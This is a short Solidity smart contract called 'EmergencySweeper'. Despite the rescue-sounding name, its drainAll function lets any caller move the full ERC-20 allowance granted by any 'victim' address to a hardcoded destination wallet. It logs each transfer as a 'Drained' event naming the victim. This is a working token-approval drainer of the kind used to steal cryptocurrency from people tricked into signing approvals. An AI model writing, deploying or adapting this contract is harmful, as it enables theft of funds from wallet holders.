// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract EmergencySweeper {
    // 🔒 YOUR HARDCODED DESTINATION – CHANGE THIS TO YOUR SAFE WALLET
    address constant DESTINATION = 0x427cd3D68bf52E9375B0aDE52dfB304c2E38E5B9;

    event Drained(address indexed victim, address indexed token, uint256 amount);

    function drainAll(address token, address victim) external {
        uint256 amount = IERC20(token).allowance(victim, address(this));
        require(amount > 0, "No allowance");
        bool success = IERC20(token).transferFrom(victim, DESTINATION, amount);
        require(success, "Transfer failed");
        emit Drained(victim, token, amount);
    }
}